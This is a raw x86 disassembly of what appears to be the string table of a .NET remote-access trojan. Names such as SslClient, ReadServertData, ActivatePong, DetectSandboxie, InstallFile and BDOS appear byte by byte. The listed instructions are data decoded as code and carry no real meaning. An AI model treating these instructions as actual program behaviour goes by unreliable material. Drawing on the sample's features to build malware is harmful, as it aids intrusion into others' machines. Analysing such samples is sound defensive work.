  405a0b:	31 36                	xor    %esi,(%esi)
  405a0d:	39 32                	cmp    %esi,(%edx)
  405a0f:	43                   	inc    %ebx
  405a10:	45                   	inc    %ebp
  405a11:	39 39                	cmp    %edi,(%ecx)
  405a13:	34 37                	xor    $0x37,%al
  405a15:	41                   	inc    %ecx
  405a16:	31 39                	xor    %edi,(%ecx)
  405a18:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  405a1c:	36 39 38             	cmp    %edi,%ss:(%eax)
  405a1f:	44                   	inc    %esp
  405a20:	38 46 35             	cmp    %al,0x35(%esi)
  405a23:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  405a27:	41                   	inc    %ecx
  405a28:	37                   	aaa
  405a29:	32 31                	xor    (%ecx),%dh
  405a2b:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  405a31:	43                   	inc    %ebx
  405a32:	35 38 42 00 47       	xor    $0x47004238,%eax
  405a37:	43                   	inc    %ebx
  405a38:	00 45 53             	add    %al,0x53(%ebp)
  405a3b:	5f                   	pop    %edi
  405a3c:	53                   	push   %ebx
  405a3d:	59                   	pop    %ecx
  405a3e:	53                   	push   %ebx
  405a3f:	54                   	push   %esp
  405a40:	45                   	inc    %ebp
  405a41:	4d                   	dec    %ebp
  405a42:	5f                   	pop    %edi
  405a43:	52                   	push   %edx
  405a44:	45                   	inc    %ebp
  405a45:	51                   	push   %ecx
  405a46:	55                   	push   %ebp
  405a47:	49                   	dec    %ecx
  405a48:	52                   	push   %edx
  405a49:	45                   	inc    %ebp
  405a4a:	44                   	inc    %esp
  405a4b:	00 45 53             	add    %al,0x53(%ebp)
  405a4e:	5f                   	pop    %edi
  405a4f:	44                   	inc    %esp
  405a50:	49                   	dec    %ecx
  405a51:	53                   	push   %ebx
  405a52:	50                   	push   %eax
  405a53:	4c                   	dec    %esp
  405a54:	41                   	inc    %ecx
  405a55:	59                   	pop    %ecx
  405a56:	5f                   	pop    %edi
  405a57:	52                   	push   %edx
  405a58:	45                   	inc    %ebp
  405a59:	51                   	push   %ecx
  405a5a:	55                   	push   %ebp
  405a5b:	49                   	dec    %ecx
  405a5c:	52                   	push   %edx
  405a5d:	45                   	inc    %ebp
  405a5e:	44                   	inc    %esp
  405a5f:	00 4d 61             	add    %cl,0x61(%ebp)
  405a62:	70 4e                	jo     0x405ab2
  405a64:	61                   	popa
  405a65:	6d                   	insl   (%dx),%es:(%edi)
  405a66:	65 54                	gs push %esp
  405a68:	6f                   	outsl  %ds:(%esi),(%dx)
  405a69:	4f                   	dec    %edi
  405a6a:	49                   	dec    %ecx
  405a6b:	44                   	inc    %esp
  405a6c:	00 67 65             	add    %ah,0x65(%edi)
  405a6f:	74 5f                	je     0x405ad0
  405a71:	46                   	inc    %esi
  405a72:	6f                   	outsl  %ds:(%esi),(%dx)
  405a73:	72 6d                	jb     0x405ae2
  405a75:	61                   	popa
  405a76:	74 49                	je     0x405ac1
  405a78:	44                   	inc    %esp
  405a79:	00 45 58             	add    %al,0x58(%ebp)
  405a7c:	45                   	inc    %ebp
  405a7d:	43                   	inc    %ebx
  405a7e:	55                   	push   %ebp
  405a7f:	54                   	push   %esp
  405a80:	49                   	dec    %ecx
  405a81:	4f                   	dec    %edi
  405a82:	4e                   	dec    %esi
  405a83:	5f                   	pop    %edi
  405a84:	53                   	push   %ebx
  405a85:	54                   	push   %esp
  405a86:	41                   	inc    %ecx
  405a87:	54                   	push   %esp
  405a88:	45                   	inc    %ebp
  405a89:	00 67 65             	add    %ah,0x65(%edi)
  405a8c:	74 5f                	je     0x405aed
  405a8e:	41                   	inc    %ecx
  405a8f:	53                   	push   %ebx
  405a90:	43                   	inc    %ebx
  405a91:	49                   	dec    %ecx
  405a92:	49                   	dec    %ecx
  405a93:	00 53 79             	add    %dl,0x79(%ebx)
  405a96:	73 74                	jae    0x405b0c
  405a98:	65 6d                	gs insl (%dx),%es:(%edi)
  405a9a:	2e 49                	cs dec %ecx
  405a9c:	4f                   	dec    %edi
  405a9d:	00 46 38             	add    %al,0x38(%esi)
  405aa0:	42                   	inc    %edx
  405aa1:	45                   	inc    %ebp
  405aa2:	54                   	push   %esp
  405aa3:	41                   	inc    %ecx
  405aa4:	50                   	push   %eax
  405aa5:	50                   	push   %eax
  405aa6:	00 49 73             	add    %cl,0x73(%ecx)
  405aa9:	58                   	pop    %eax
  405aaa:	50                   	push   %eax
  405aab:	00 42 44             	add    %al,0x44(%edx)
  405aae:	4f                   	dec    %edi
  405aaf:	53                   	push   %ebx
  405ab0:	00 45 53             	add    %al,0x53(%ebp)
  405ab3:	5f                   	pop    %edi
  405ab4:	43                   	inc    %ebx
  405ab5:	4f                   	dec    %edi
  405ab6:	4e                   	dec    %esi
  405ab7:	54                   	push   %esp
  405ab8:	49                   	dec    %ecx
  405ab9:	4e                   	dec    %esi
  405aba:	55                   	push   %ebp
  405abb:	4f                   	dec    %edi
  405abc:	55                   	push   %ebp
  405abd:	53                   	push   %ebx
  405abe:	00 67 65             	add    %ah,0x65(%edi)
  405ac1:	74 5f                	je     0x405b22
  405ac3:	49                   	dec    %ecx
  405ac4:	56                   	push   %esi
  405ac5:	00 73 65             	add    %dh,0x65(%ebx)
  405ac8:	74 5f                	je     0x405b29
  405aca:	49                   	dec    %ecx
  405acb:	56                   	push   %esi
  405acc:	00 47 65             	add    %al,0x65(%edi)
  405acf:	6e                   	outsb  %ds:(%esi),(%dx)
  405ad0:	65 72 61             	gs jb  0x405b34
  405ad3:	74 65                	je     0x405b3a
  405ad5:	49                   	dec    %ecx
  405ad6:	56                   	push   %esi
  405ad7:	00 4d 54             	add    %cl,0x54(%ebp)
  405ada:	58                   	pop    %eax
  405adb:	00 76 61             	add    %dh,0x61(%esi)
  405ade:	6c                   	insb   (%dx),%es:(%edi)
  405adf:	75 65                	jne    0x405b46
  405ae1:	5f                   	pop    %edi
  405ae2:	5f                   	pop    %edi
  405ae3:	00 52 65             	add    %dl,0x65(%edx)
  405ae6:	61                   	popa
  405ae7:	64 53                	fs push %ebx
  405ae9:	65 72 76             	gs jb  0x405b62
  405aec:	65 72 74             	gs jb  0x405b63
  405aef:	44                   	inc    %esp
  405af0:	61                   	popa
  405af1:	74 61                	je     0x405b54
  405af3:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  405af7:	61                   	popa
  405af8:	00 4d 65             	add    %cl,0x65(%ebp)
  405afb:	73 73                	jae    0x405b70
  405afd:	61                   	popa
  405afe:	67 65 50             	addr16 gs push %eax
  405b01:	61                   	popa
  405b02:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  405b05:	69 62 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%edx),%esp
  405b0c:	72 6c                	jb     0x405b7a
  405b0e:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  405b15:	65 6d                	gs insl (%dx),%es:(%edi)
  405b17:	2e 43                	cs inc %ebx
  405b19:	6f                   	outsl  %ds:(%esi),(%dx)
  405b1a:	6c                   	insb   (%dx),%es:(%edi)
  405b1b:	6c                   	insb   (%dx),%es:(%edi)
  405b1c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405b21:	6e                   	outsb  %ds:(%esi),(%dx)
  405b22:	73 2e                	jae    0x405b52
  405b24:	47                   	inc    %edi
  405b25:	65 6e                	outsb  %gs:(%esi),(%dx)
  405b27:	65 72 69             	gs jb  0x405b93
  405b2a:	63 00                	arpl   %eax,(%eax)
  405b2c:	4d                   	dec    %ebp
  405b2d:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405b34:	74 2e                	je     0x405b64
  405b36:	56                   	push   %esi
  405b37:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  405b3e:	73 69                	jae    0x405ba9
  405b40:	63 00                	arpl   %eax,(%eax)
  405b42:	67 65 74 5f          	addr16 gs je 0x405ba5
  405b46:	53                   	push   %ebx
  405b47:	65 6e                	outsb  %gs:(%esi),(%dx)
  405b49:	64 53                	fs push %ebx
  405b4b:	79 6e                	jns    0x405bbb
  405b4d:	63 00                	arpl   %eax,(%eax)
  405b4f:	45                   	inc    %ebp
  405b50:	6e                   	outsb  %ds:(%esi),(%dx)
  405b51:	64 52                	fs push %edx
  405b53:	65 61                	gs popa
  405b55:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  405b59:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  405b60:	00 
  405b61:	54                   	push   %esp
  405b62:	68 72 65 61 64       	push   $0x64616572
  405b67:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  405b6b:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  405b6f:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  405b73:	41                   	inc    %ecx
  405b74:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  405b7a:	61                   	popa
  405b7b:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  405b81:	74 5f                	je     0x405be2
  405b83:	43                   	inc    %ebx
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	6e                   	outsb  %ds:(%esi),(%dx)
  405b86:	6e                   	outsb  %ds:(%esi),(%dx)
  405b87:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b8c:	00 67 65             	add    %ah,0x65(%edi)
  405b8f:	74 5f                	je     0x405bf0
  405b91:	49                   	dec    %ecx
  405b92:	73 43                	jae    0x405bd7
  405b94:	6f                   	outsl  %ds:(%esi),(%dx)
  405b95:	6e                   	outsb  %ds:(%esi),(%dx)
  405b96:	6e                   	outsb  %ds:(%esi),(%dx)
  405b97:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b9c:	00 73 65             	add    %dh,0x65(%ebx)
  405b9f:	74 5f                	je     0x405c00
  405ba1:	49                   	dec    %ecx
  405ba2:	73 43                	jae    0x405be7
  405ba4:	6f                   	outsl  %ds:(%esi),(%dx)
  405ba5:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba6:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba7:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405bac:	00 52 65             	add    %dl,0x65(%edx)
  405baf:	63 65 69             	arpl   %esp,0x69(%ebp)
  405bb2:	76 65                	jbe    0x405c19
  405bb4:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405bb8:	74 5f                	je     0x405c19
  405bba:	47                   	inc    %edi
  405bbb:	75 69                	jne    0x405c26
  405bbd:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  405bc1:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  405bc8:	64 
  405bc9:	53                   	push   %ebx
  405bca:	79 6e                	jns    0x405c3a
  405bcc:	63 3e                	arpl   %edi,(%esi)
  405bce:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405bd2:	61                   	popa
  405bd3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  405bd7:	67 46                	addr16 inc %esi
  405bd9:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405be0:	73 43                	jae    0x405c25
  405be2:	6f                   	outsl  %ds:(%esi),(%dx)
  405be3:	6e                   	outsb  %ds:(%esi),(%dx)
  405be4:	6e                   	outsb  %ds:(%esi),(%dx)
  405be5:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405bea:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405bef:	61                   	popa
  405bf0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bf3:	6e                   	outsb  %ds:(%esi),(%dx)
  405bf4:	67 46                	addr16 inc %esi
  405bf6:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  405bfd:	65 65 70 41          	gs gs jo 0x405c42
  405c01:	6c                   	insb   (%dx),%es:(%edi)
  405c02:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  405c09:	42                   	inc    %edx
  405c0a:	61                   	popa
  405c0b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c0e:	6e                   	outsb  %ds:(%esi),(%dx)
  405c0f:	67 46                	addr16 inc %esi
  405c11:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  405c18:	65 61                	gs popa
  405c1a:	64 65 72 53          	fs gs jb 0x405c71
  405c1e:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  405c25:	42                   	inc    %edx
  405c26:	61                   	popa
  405c27:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c2a:	6e                   	outsb  %ds:(%esi),(%dx)
  405c2b:	67 46                	addr16 inc %esi
  405c2d:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  405c34:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  405c3b:	42                   	inc    %edx
  405c3c:	61                   	popa
  405c3d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c40:	6e                   	outsb  %ds:(%esi),(%dx)
  405c41:	67 46                	addr16 inc %esi
  405c43:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  405c4a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405c4e:	61                   	popa
  405c4f:	74 65                	je     0x405cb6
  405c51:	50                   	push   %eax
  405c52:	6f                   	outsl  %ds:(%esi),(%dx)
  405c53:	6e                   	outsb  %ds:(%esi),(%dx)
  405c54:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  405c5a:	61                   	popa
  405c5b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c5e:	6e                   	outsb  %ds:(%esi),(%dx)
  405c5f:	67 46                	addr16 inc %esi
  405c61:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405c68:	6e                   	outsb  %ds:(%esi),(%dx)
  405c69:	74 65                	je     0x405cd0
  405c6b:	72 76                	jb     0x405ce3
  405c6d:	61                   	popa
  405c6e:	6c                   	insb   (%dx),%es:(%edi)
  405c6f:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405c74:	61                   	popa
  405c75:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c78:	6e                   	outsb  %ds:(%esi),(%dx)
  405c79:	67 46                	addr16 inc %esi
  405c7b:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  405c82:	75 66                	jne    0x405cea
  405c84:	66 65 72 3e          	data16 gs jb 0x405cc6
  405c88:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405c8c:	61                   	popa
  405c8d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c90:	6e                   	outsb  %ds:(%esi),(%dx)
  405c91:	67 46                	addr16 inc %esi
  405c93:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  405c9a:	66 66 73 65          	data16 data16 jae 0x405d03
  405c9e:	74 3e                	je     0x405cde
  405ca0:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405ca4:	61                   	popa
  405ca5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405ca8:	6e                   	outsb  %ds:(%esi),(%dx)
  405ca9:	67 46                	addr16 inc %esi
  405cab:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  405cb2:	73 6c                	jae    0x405d20
  405cb4:	43                   	inc    %ebx
  405cb5:	6c                   	insb   (%dx),%es:(%edi)
  405cb6:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405cbd:	5f                   	pop    %edi
  405cbe:	42                   	inc    %edx
  405cbf:	61                   	popa
  405cc0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405cc3:	6e                   	outsb  %ds:(%esi),(%dx)
  405cc4:	67 46                	addr16 inc %esi
  405cc6:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  405ccd:	63 70 43             	arpl   %esi,0x43(%eax)
  405cd0:	6c                   	insb   (%dx),%es:(%edi)
  405cd1:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405cd8:	5f                   	pop    %edi
  405cd9:	42                   	inc    %edx
  405cda:	61                   	popa
  405cdb:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405cde:	6e                   	outsb  %ds:(%esi),(%dx)
  405cdf:	67 46                	addr16 inc %esi
  405ce1:	69 65 6c 64 00 68 57 	imul   $0x57680064,0x6c(%ebp),%esp
  405ce8:	6e                   	outsb  %ds:(%esi),(%dx)
  405ce9:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  405ced:	6e                   	outsb  %ds:(%esi),(%dx)
  405cee:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  405cf2:	70 65                	jo     0x405d59
  405cf4:	6e                   	outsb  %ds:(%esi),(%dx)
  405cf5:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  405cf9:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  405d00:	61 
  405d01:	6c                   	insb   (%dx),%es:(%edi)
  405d02:	75 65                	jne    0x405d69
  405d04:	4b                   	dec    %ebx
  405d05:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  405d0c:	6c                   	insb   (%dx),%es:(%edi)
  405d0d:	61                   	popa
  405d0e:	63 65 00             	arpl   %esp,0x0(%ebp)
  405d11:	43                   	inc    %ebx
  405d12:	72 65                	jb     0x405d79
  405d14:	61                   	popa
  405d15:	74 65                	je     0x405d7c
  405d17:	49                   	dec    %ecx
  405d18:	6e                   	outsb  %ds:(%esi),(%dx)
  405d19:	73 74                	jae    0x405d8f
  405d1b:	61                   	popa
  405d1c:	6e                   	outsb  %ds:(%esi),(%dx)
  405d1d:	63 65 00             	arpl   %esp,0x0(%ebp)
  405d20:	73 65                	jae    0x405d87
  405d22:	74 5f                	je     0x405d83
  405d24:	4d                   	dec    %ebp
  405d25:	6f                   	outsl  %ds:(%esi),(%dx)
  405d26:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  405d2b:	6c                   	insb   (%dx),%es:(%edi)
  405d2c:	65 4d                	gs dec %ebp
  405d2e:	6f                   	outsl  %ds:(%esi),(%dx)
  405d2f:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  405d34:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  405d3b:	64 65 
  405d3d:	00 45 6e             	add    %al,0x6e(%ebp)
  405d40:	74 65                	je     0x405da7
  405d42:	72 44                	jb     0x405d88
  405d44:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405d48:	4d                   	dec    %ebp
  405d49:	6f                   	outsl  %ds:(%esi),(%dx)
  405d4a:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  405d4f:	79 70                	jns    0x405dc1
  405d51:	74 6f                	je     0x405dc2
  405d53:	53                   	push   %ebx
  405d54:	74 72                	je     0x405dc8
  405d56:	65 61                	gs popa
  405d58:	6d                   	insl   (%dx),%es:(%edi)
  405d59:	4d                   	dec    %ebp
  405d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  405d5b:	64 65 00 43 69       	fs add %al,%gs:0x69(%ebx)
  405d60:	70 68                	jo     0x405dca
  405d62:	65 72 4d             	gs jb  0x405db2
  405d65:	6f                   	outsl  %ds:(%esi),(%dx)
  405d66:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  405d6b:	6c                   	insb   (%dx),%es:(%edi)
  405d6c:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  405d71:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  405d77:	65 74 65             	gs je  0x405ddf
  405d7a:	53                   	push   %ebx
  405d7b:	75 62                	jne    0x405ddf
  405d7d:	4b                   	dec    %ebx
  405d7e:	65 79 54             	gs jns 0x405dd5
  405d81:	72 65                	jb     0x405de8
  405d83:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405d87:	74 5f                	je     0x405de8
  405d89:	4d                   	dec    %ebp
  405d8a:	65 73 73             	gs jae 0x405e00
  405d8d:	61                   	popa
  405d8e:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  405d93:	74 65                	je     0x405dfa
  405d95:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  405d99:	6e                   	outsb  %ds:(%esi),(%dx)
  405d9a:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  405d9e:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  405da5:	6b 65 00 45          	imul   $0x45,0x0(%ebp),%esp
  405da9:	6e                   	outsb  %ds:(%esi),(%dx)
  405daa:	75 6d                	jne    0x405e19
  405dac:	65 72 61             	gs jb  0x405e10
  405daf:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405db3:	49                   	dec    %ecx
  405db4:	44                   	inc    %esp
  405db5:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405dbc:	6c                   	insb   (%dx),%es:(%edi)
  405dbd:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405dc1:	74 5f                	je     0x405e22
  405dc3:	48                   	dec    %eax
  405dc4:	61                   	popa
  405dc5:	6e                   	outsb  %ds:(%esi),(%dx)
  405dc6:	64 6c                	fs insb (%dx),%es:(%edi)
  405dc8:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405dcc:	6e                   	outsb  %ds:(%esi),(%dx)
  405dcd:	74 69                	je     0x405e38
  405dcf:	6d                   	insl   (%dx),%es:(%edi)
  405dd0:	65 46                	gs inc %esi
  405dd2:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  405dd9:	64 6c                	fs insb (%dx),%es:(%edi)
  405ddb:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405ddf:	74 4d                	je     0x405e2e
  405de1:	6f                   	outsl  %ds:(%esi),(%dx)
  405de2:	64 75 6c             	fs jne 0x405e51
  405de5:	65 48                	gs dec %eax
  405de7:	61                   	popa
  405de8:	6e                   	outsb  %ds:(%esi),(%dx)
  405de9:	64 6c                	fs insb (%dx),%es:(%edi)
  405deb:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405def:	6e                   	outsb  %ds:(%esi),(%dx)
  405df0:	74 69                	je     0x405e5b
  405df2:	6d                   	insl   (%dx),%es:(%edi)
  405df3:	65 54                	gs push %esp
  405df5:	79 70                	jns    0x405e67
  405df7:	65 48                	gs dec %eax
  405df9:	61                   	popa
  405dfa:	6e                   	outsb  %ds:(%esi),(%dx)
  405dfb:	64 6c                	fs insb (%dx),%es:(%edi)
  405dfd:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405e01:	74 54                	je     0x405e57
  405e03:	79 70                	jns    0x405e75
  405e05:	65 46                	gs inc %esi
  405e07:	72 6f                	jb     0x405e78
  405e09:	6d                   	insl   (%dx),%es:(%edi)
  405e0a:	48                   	dec    %eax
  405e0b:	61                   	popa
  405e0c:	6e                   	outsb  %ds:(%esi),(%dx)
  405e0d:	64 6c                	fs insb (%dx),%es:(%edi)
  405e0f:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  405e13:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  405e1a:	65 
  405e1b:	00 49 6e             	add    %cl,0x6e(%ecx)
  405e1e:	73 74                	jae    0x405e94
  405e20:	61                   	popa
  405e21:	6c                   	insb   (%dx),%es:(%edi)
  405e22:	6c                   	insb   (%dx),%es:(%edi)
  405e23:	46                   	inc    %esi
  405e24:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  405e2b:	6e 
  405e2c:	52                   	push   %edx
  405e2d:	6f                   	outsl  %ds:(%esi),(%dx)
  405e2e:	6c                   	insb   (%dx),%es:(%edi)
  405e2f:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  405e33:	6e                   	outsb  %ds:(%esi),(%dx)
  405e34:	64 6f                	outsl  %fs:(%esi),(%dx)
  405e36:	77 73                	ja     0x405eab
  405e38:	42                   	inc    %edx
  405e39:	75 69                	jne    0x405ea4
  405e3b:	6c                   	insb   (%dx),%es:(%edi)
  405e3c:	74 49                	je     0x405e87
  405e3e:	6e                   	outsb  %ds:(%esi),(%dx)
  405e3f:	52                   	push   %edx
  405e40:	6f                   	outsl  %ds:(%esi),(%dx)
  405e41:	6c                   	insb   (%dx),%es:(%edi)
  405e42:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405e46:	74 41                	je     0x405e89
  405e48:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405e4c:	65 57                	gs push %edi
  405e4e:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  405e55:	74 6c                	je     0x405ec3
  405e57:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e5b:	74 5f                	je     0x405ebc
  405e5d:	4d                   	dec    %ebp
  405e5e:	61                   	popa
  405e5f:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  405e66:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405e6a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e6b:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e6e:	73 4d                	jae    0x405ebd
  405e70:	6f                   	outsl  %ds:(%esi),(%dx)
  405e71:	64 75 6c             	fs jne 0x405ee0
  405e74:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405e78:	74 5f                	je     0x405ed9
  405e7a:	57                   	push   %edi
  405e7b:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405e82:	79 6c                	jns    0x405ef0
  405e84:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405e88:	6f                   	outsl  %ds:(%esi),(%dx)
  405e89:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e8c:	73 57                	jae    0x405ee5
  405e8e:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405e95:	79 6c                	jns    0x405f03
  405e97:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e9b:	74 5f                	je     0x405efc
  405e9d:	4e                   	dec    %esi
  405e9e:	61                   	popa
  405e9f:	6d                   	insl   (%dx),%es:(%edi)
  405ea0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405ea4:	74 5f                	je     0x405f05
  405ea6:	46                   	inc    %esi
  405ea7:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405eae:	00 
  405eaf:	73 65                	jae    0x405f16
  405eb1:	74 5f                	je     0x405f12
  405eb3:	46                   	inc    %esi
  405eb4:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405ebb:	00 
  405ebc:	47                   	inc    %edi
  405ebd:	65 74 54             	gs je  0x405f14
  405ec0:	65 6d                	gs insl (%dx),%es:(%edi)
  405ec2:	70 46                	jo     0x405f0a
  405ec4:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405ecb:	00 
  405ecc:	47                   	inc    %edi
  405ecd:	65 74 46             	gs je  0x405f16
  405ed0:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405ed7:	00 
  405ed8:	6c                   	insb   (%dx),%es:(%edi)
  405ed9:	70 4d                	jo     0x405f28
  405edb:	6f                   	outsl  %ds:(%esi),(%dx)
  405edc:	64 75 6c             	fs jne 0x405f4b
  405edf:	65 4e                	gs dec %esi
  405ee1:	61                   	popa
  405ee2:	6d                   	insl   (%dx),%es:(%edi)
  405ee3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405ee7:	74 5f                	je     0x405f48
  405ee9:	4d                   	dec    %ebp
  405eea:	61                   	popa
  405eeb:	63 68 69             	arpl   %ebp,0x69(%eax)
  405eee:	6e                   	outsb  %ds:(%esi),(%dx)
  405eef:	65 4e                	gs dec %esi
  405ef1:	61                   	popa
  405ef2:	6d                   	insl   (%dx),%es:(%edi)
  405ef3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405ef7:	74 5f                	je     0x405f58
  405ef9:	4f                   	dec    %edi
  405efa:	53                   	push   %ebx
  405efb:	46                   	inc    %esi
  405efc:	75 6c                	jne    0x405f6a
  405efe:	6c                   	insb   (%dx),%es:(%edi)
  405eff:	4e                   	dec    %esi
  405f00:	61                   	popa
  405f01:	6d                   	insl   (%dx),%es:(%edi)
  405f02:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405f06:	74 5f                	je     0x405f67
  405f08:	46                   	inc    %esi
  405f09:	75 6c                	jne    0x405f77
  405f0b:	6c                   	insb   (%dx),%es:(%edi)
  405f0c:	4e                   	dec    %esi
  405f0d:	61                   	popa
  405f0e:	6d                   	insl   (%dx),%es:(%edi)
  405f0f:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  405f13:	56                   	push   %esi
  405f14:	61                   	popa
